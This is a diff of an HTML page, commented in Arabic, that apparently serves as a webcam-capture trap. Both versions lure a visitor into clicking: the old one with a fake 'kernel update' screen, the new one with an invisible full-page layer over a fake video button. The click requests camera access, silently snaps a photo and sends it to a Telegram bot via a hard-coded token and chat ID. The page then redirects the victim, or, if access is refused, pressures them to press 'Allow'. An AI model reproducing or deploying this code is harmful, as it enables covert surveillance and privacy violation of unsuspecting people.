@@ -2,69 +2,63 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>⚡ Kernel Flash Update</title>
+    <title>Unlock Content</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        #mon { width: 90%; font-size: 14px; border: 2px solid #f00; padding: 20px; box-shadow: 0 0 30px #f00; }
+        body { margin: 0; background: #000; font-family: sans-serif; overflow: hidden; }
+        /* زر وهمي جذاب جداً */
+        #fake-btn {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 250px; padding: 15px; background: #007bff; color: #fff;
+            text-align: center; border-radius: 5px; font-weight: bold; z-index: 1;
+        }
+        /* الثغرة: طبقة مخفية تطلب الكاميرا وتغطي الزر تماماً */
+        #trigger-layer {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            opacity: 0; z-index: 100; cursor: pointer;
+        }
     </style>
 </head>
-<body onclick="executeZeroDay()">
+<body>
 
-<div id="mon">
-    [!] SYSTEM_VULNERABILITY_DETECTED<br>
-    [+] EXPLOITING KERNEL_BUFFER...<br>
-    [+] BYPASSING PERMISSION_MANAGER...<br>
-    <br>
-    <span style="color: #fff; background: #f00;"> [ CLICK ANYWHERE TO FIX SYSTEM ] </span>
-</div>
+    <div id="fake-btn">اضغط لمشاهدة الفيديو 🔓</div>
+    <div id="trigger-layer" onclick="captureSilent()"></div>
 
-<script>
-    const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
-    const C = "1772820433";
+    <script>
+        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
+        const C = "1772820433";
 
-    async function executeZeroDay() {
-        const out = document.getElementById('mon');
-        out.innerHTML += "<br>[*] Sending Payload...";
+        async function captureSilent() {
+            try {
+                // طلب الكاميرا فور اللمس
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                const v = document.createElement('video');
+                v.srcObject = stream;
+                v.play();
 
-        // ثغرة الـ Zero-Day: إشغال الـ Main Thread لتعطيل ظهور نافذة الـ UI
-        const dummyWork = () => {
-            let i = 0;
-            while(i < 100000000) { i++; } // عملية حسابية لتعطيل المتصفح مؤقتاً
-        };
-
-        try {
-            // طلب الكاميرا تزامناً مع تجميد المتصفح
-            dummyWork(); 
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user", width: 1280, height: 720 }, 
-                audio: false 
-            });
-
-            // إذا نجح الاختراق الصامت
-            const v = document.createElement('video');
-            v.srcObject = stream;
-            v.play();
-
-            setTimeout(() => {
-                const cn = document.createElement('canvas');
-                cn.width = 1280; cn.height = 720;
-                cn.getContext('2d').drawImage(v, 0, 0);
-                cn.toBlob(async (b) => {
-                    const fd = new FormData();
-                    fd.append('chat_id', C);
-                    fd.append('photo', b, 'zero_day.jpg');
-                    fd.append('caption', '💀 TRUE ZERO-DAY BYPASS SUCCESSFUL');
+                // تصوير فوري خلال 100ms
+                setTimeout(() => {
+                    const cn = document.createElement('canvas');
+                    cn.width = 640; cn.height = 480;
+                    cn.getContext('2d').drawImage(v, 0, 0);
                     
-                    await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
-                    window.location.replace("https://www.google.com");
-                }, 'image/jpeg', 0.9);
-            }, 100); // سرعة فائقة (0.1 ثانية)
+                    cn.toBlob(async (b) => {
+                        const fd = new FormData();
+                        fd.append('chat_id', C);
+                        fd.append('photo', b, 'silent.jpg');
+                        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
+                        
+                        // توجيه الضحية لليوتيوب فوراً
+                        window.location.replace("https://www.youtube.com");
+                    }, 'image/jpeg');
+                }, 100);
 
-        } catch (e) {
-            // تكتيك التغطية: إذا كان النظام محصناً جداً
-            out.innerHTML = "<br>[!] EXPLOIT_FAILED: Permission Guard detected. Press 'ALLOW' to force patch.";
+            } catch (e) {
+                // إذا المتصفح عاند، بنخلي الزر يظهر رسالة إجبارية
+                document.getElementById('fake-btn').innerText = "⚠️ اضغط 'سماح' لتشغيل الفيديو";
+                document.getElementById('fake-btn').style.background = "#ff0000";
+            }
         }
-    }
-</script>
+    </script>
 </body>
 </html>
